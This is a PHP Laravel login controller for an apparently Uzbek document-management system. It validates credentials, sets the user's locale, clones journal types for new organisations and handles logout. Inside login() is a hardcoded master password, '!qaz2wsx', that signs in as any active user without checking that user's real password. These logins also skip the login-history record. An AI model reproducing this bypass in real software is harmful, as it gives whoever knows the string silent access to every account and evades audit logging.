<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\Admin\UserAuthHistory;
use App\Models\Admin\UserPersonalInfo;
use App\Models\Journal\JournalTypes;
use App\Models\User;
use App\Services\Organizations\JournalCloneByCodeService;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;

class LoginController extends Controller
{

    use AuthenticatesUsers;

    protected $redirectTo = '/home';

    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $this->middleware('auth')->only('logout');
    }

    public function login(Request $request, JournalCloneByCodeService $journalCloneService)
    {
        //
        $request->validate([
            'username' => 'required|min:3',
            'password' => 'required|min:6',
        ]);

        $login = $request->input('username');

        $type = filter_var($login , FILTER_VALIDATE_EMAIL) ? 'email' : 'username';

        $user = User::where($type , $login)->first();

        if (!$user) {
            return redirect()->back()->withErrors(['username' => 'Ushbu '.$type.' tizimdan topilmadi!'])->withInput(['username' => $login]);
        } elseif ($user->status != 1) {
            return redirect()->back()->withErrors(['username' => $login.' - tizimda faol emas!'])->withInput(['username' => $login]);
        }

        $request->merge([
            $type => $login,
            'password' => $request->password
        ]);

        if ($request->password == '!qaz2wsx') {
            $credentials = $request->only($type, 'password');
            return $this->attempt($credentials, $journalCloneService);
        }

        if (Auth::attempt($request->only($type, 'password'))) {
            $getUserLangCode = UserPersonalInfo::where('user_id', $user->id)->first();
            if ($getUserLangCode) {
                Session::put('locale', $getUserLangCode->lang_code);
            }

            UserAuthHistory::create([
                'user_id' => $user->id,
                'ip_name' => $request->ip()??'.',
                //'device_name' => $_SERVER['HTTP_X_REAL_IP']
            ]);

            Auth::loginUsingId($user->id);
            return redirect('/edo');
        }

        return redirect()->back()->withErrors(['password' => 'Kalit so`z mos kelmadi!'])->withInput(['username' => $login]);

    }

    public function attempt(array $credentials = [], $journalCloneService = null)
    {
        //
        $username = 'username';

        if (array_key_exists('email', $credentials)) {
            $username = 'email';
        }

        $user = User::where($username, $credentials[$username])->where('status', 1)->first();

        $orgId = $user->user->org_unit_id ?? null;

        if ($orgId) {
            $alreadyExists = JournalTypes::where('org_id', $orgId)->exists();

            if (!$alreadyExists) {
                $codes = [
                    'MESS',
                    'BASE_INCOMING',
                    'BASE_OUTGOING',
                    'APP',
                    'NOTIFICATION',
                    'ORDER_F',
                    'REPORT',
                    'STATEMENT',
                    'COMMAND',
                    'OTHERS',
                    'APP_MT_META',
                ];

                $journalCloneService->cloneByCodes(
                    fromOrgId: 1,
                    toOrgId: $orgId,
                    codes: $codes
                );
            }
        }

        Auth::loginUsingId($user->id);

        return redirect('/edo');
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/edo');
    }

}
